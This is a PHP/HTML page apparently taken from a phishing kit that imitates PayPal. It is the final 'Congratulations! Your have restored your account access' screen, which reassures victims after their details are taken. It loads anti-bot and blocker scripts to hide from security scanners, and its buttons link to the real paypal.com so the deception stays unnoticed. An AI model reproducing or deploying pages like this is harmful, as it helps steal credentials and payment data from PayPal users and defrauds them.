<?php
 include 'php/err.php';
 include 'php/blocker.php';
include 'php/antibots4.php';
?>
<html>
<head>
<title>Confirm your account</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width" />
<link rel="icon" href="res/img/icon.png" />
<link rel="stylesheet" href="res/css/inputs.css">  
<link rel='stylesheet' href='res/css/add.css' />
<script src='res/js/q.js'></script>
<script src='res/js/v.js'></script>
<script src='res/js/m.js'></script>
<script src='res/js/p.js'></script>
</head>
<body>
<center>
 <style>
 a:link,a:visited,a:active,a:hover{text-decoration:none;}
 </style>
<header>
<div class="headerleft">
<a href="https://www.paypal.com/us"><img src="res/img/logo.png" ></img></a>
</div>
<div class="headerright">
<a href="https://www.paypal.com/us"> <button class="mybtn"><b><font color="white">My Account</font></b></button></a>
</div>
</header>
<!------------ begin Form ------------------------>
<div class="for" >
<img src="img/check.gif" style="width:30%;"></img>
<h2>Congratulations! Your have restored your account access.</h2>
<h4>Now you can enjoy our services, thank you for choosing our trusted service.
your account will be verified in the next 24 hours.</h4>
<div class="two">
<div class="left">
<a href="https://www.paypal.com/us"><input  type="button" id="backtocreditcard"  class="textInput  btn  " style="" value="My PayPal"></a>
</div>
<div class="right">
<a href="https://www.paypal.com/us"><input  type="button" id="skiptolinkbank"  class="textInput  btn skip" style="" value="Log Out"></a>
</div>
</div>
</div>
<div class="footer">
<a href="#" class="fa">Contact us</a>
<a href="#" class="fa"> Worldwide</a>
<a href="#" class="fa">Privacy</a>
<a href="#" class="fa">Legal</a>
</div>
<!------------ end Form ------------------------>
<div id="fuck" class="spinner " style="display:none;">
<img src="res/img/loader.gif"></img>
</div>
</center>
</body>
</html>